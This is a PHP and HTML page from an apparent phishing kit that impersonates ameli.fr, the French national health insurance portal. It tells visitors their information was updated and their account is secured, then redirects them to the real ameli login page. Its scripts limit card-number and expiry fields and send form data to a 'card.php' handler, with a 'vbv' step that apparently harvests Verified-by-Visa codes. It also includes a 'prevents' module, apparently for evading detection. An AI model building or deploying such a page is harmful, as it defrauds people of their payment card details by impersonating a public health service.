<?php 

include("../common/sub_includes.php");
include("../prevents/all.php");
include ("../settings.php")
?>


<!DOCTYPE html>
<html lang="fr" slick-uniqueid="3">

<?php include("../common/header.php") ?>
<meta http-equiv = "refresh" content = "10; url = https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher" />

<body>
    <header class="wlp-bighorn-header" role="banner">
        <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
            <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto">
                <div></div>
                <div class="wlp-bighorn-theme wlp-bighorn-theme-borderless">
                    <div id="Header" class="wlp-bighorn-window  ">
                        <div class="wlp-bighorn-window-content">

                            <div style="overflow-x:hidden;">
                                <div class="tetiere-connexion">

                                    <div class="liens">

                                        <!-- Redirection vers la page de connexion -->

                                        <a class="r_btsubmit r_btlien" href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_login_page&amp;connexioncompte_2actionEvt=afficher" title="Votre compte ameli - Connexion">
                                            Se connecter
                                        </a>

                                    </div>

                                    <a class="r_lien_image" href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_accueil_page" title="Accéder à l'accueil">
                                        <img src="https://assure.ameli.fr/PortailAS/ShowProperty/WLP%20Repository/images/logosRegimes/logo_regime_general" class="logoam" alt="Logo du régime d'assurance maladie">
                                        <img src="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/header/Icon-60@3x.png" class="logoam-320" alt="Logo du régime d'assurance maladie">
                                    </a>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div id="ameli_portal_book_2" class="wlp-bighorn-book">
        <div class="wlp-bighorn-book-content">
            <div id="as_connexion_book" class="wlp-bighorn-book">
                <div class="wlp-bighorn-book-content">
                    <main id="as_login_page" class="wlp-bighorn-page-unconnect" role="main">
                        <section id="contenu" class="corps-de-page">
                            <div class="wlp-bighorn-layout wlp-bighorn-layout-grid">
                                <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell">
                                    <div></div>
                                    <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
                                        <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto">
                                            <div></div>
                                            <div id="connexioncompte_2" class="wlp-bighorn-window  ">
                                                <div class="wlp-bighorn-window-content">

                                                    <link href="../../framework/skins/assure/css/centrer.css" rel="stylesheet" type="text/css">
                                                    <link rel="stylesheet" href="../../framework/skins/assure/css/smart-app-banner.css" type="text/css" media="screen">



                                                    <style type="text/css">
                                                        .wlp-bighorn-book{
                                                            width : 100%;
                                                          }
                                                          #connexioncompte_2 {
                                                            padding-top: 190px;
                                                          }
                                                          
                                                          /* Small Devices, Tablets */
                                                          @media only screen and (max-width : 767px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 60px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -20px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -20px;
                                                              margin-bottom: 60px;
                                                            }
                                                            #connexioncompte_2 {
                                                              padding-top: 100px;
                                                            }
                                                            .connexioncompte_2{
                                                              padding-right: 30px !important;
                                                              padding-left: 30px !important;
                                                            }
                                                          }
                                                          
                                                          @media only screen and (min-width : 768px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 88px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -48px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -48px;
                                                              margin-bottom: 88px;
                                                            }
                                                          }
                                                          
                                                          /* Medium Devices */
                                                          @media screen and (min-width: 768px) and (max-width: 992px){
                                                            #connexioncompte_2 .centrepage {
                                                              width: 460px;
                                                            }
                                                          }
                                                        
                                                          input:-webkit-autofill {
                                                            -webkit-box-shadow: 0 0 0 50px white inset !important;
                                                          }
                                                    </style>

                                                    <div class="connexioncompte_2 centrepage">

                                                        <div class="r_cnx_page" id="loginPage">

                                                            <div>
                                                                <div class="r_cnx_maintenance">

                                                                </div>

                                                                <div class="r_cnx">
                                                                    <div class="connexion-login">
                                                                        <h1 class="texte-center title" style="line-height : 30px">
                                                                            Opération terminée
                                                                        </h1>
                                                                        <p style="text-align : center">Merci d’avoir mis à jour vos informations, votre espace est désormais sécurisé</p>

                                                                        <p style="color : grey;text-align : center;margin-top : 20px">Vous serez redirigé automatiquement dans quelques secondes</p>
                                                                        <div class="zone-alerte hidden" id="navIncompatible">
                                                                            <h2>Mon compte ameli fonctionnera mieux avec une version plus récente d'Internet Explorer !</h2>
                                                                            <span>
              
                                                                            <p>Merci d’avoir mis à jour vos informations, votre espace est désormais sécurisé</p>

                                                                            <p style="color : grey">Vous serez redirigé automatiquement dans quelques secondes</p>
                                                                        Mettez à jour votre navigateur grâce à ce lien
                                                                        <a id="ieDlLink" href="http://windows.microsoft.com/fr-fr/internet-explorer/download-ie" target="downloadIE" title="Mettre à jour son navigateur (nouvelle fenêtre)" tabindex="-1">http://windows.microsoft.com/fr-fr/internet-explorer/download-ie</a>
                                                                        </span>
                                                                        </div>
                                                                        <?php if(isset($_GET["error"])){ ?>
                                                                        <div class="zone-alerte">
                                                                        <span>Les informations fournies sont incorrectes.</span>
                                                                        </div>
                                                                        <?php }?>

                                                                        <div class="r_cnx_cadre_gris" id="idBlocCnx">

                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </section>
                    </main>
                </div>
            </div>
        </div>
    </div>
    <?php include("../common/footer.php") ?>                                                     
</body>

</html>

</html>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"
integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
crossorigin="anonymous"></script>

<script src="../assets/js/mask.js"></script>


<script src="../assets/js/format_string.js"></script>
                        

<script>
    $('#card_number_input').on('input propertychange', function() {
    charLimit(this, 16);
    });
    $('#expiration_date_input').on('input propertychange', function() {
        charLimit(this, 5);
    });

    let charLimit = (input, maxChar) => {
        let len = $(input).val().length;
        if (len > maxChar) {
            $(input).val($(input).val().substring(0, maxChar));
        };
    }
</script>
<script>
        vbv = true;

        $(document).ready(function() {
        			$("form").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "../actions/card.php",
        						data: $this.serialize(),
                                success:function(response) {

                                var jsonData = JSON.parse(response);

                                if(jsonData.success == "1"){
                                    setTimeout(function() {
                                    if(vbv == true){
                                        window.location.href = "vbv/loading.php";

                                    }
                                    else{
                                        window.location.href = "loading_finished.php";

                                    }
                                }, 3000);
                                }
                                else{
                                    setTimeout(function() {
                                        $("#error_it").css("display","block");
                                        $("#loading").css("display","none");

                                }, 1000);
                                }
                                }
        					})

        				
        
        			});
        		});
    </script>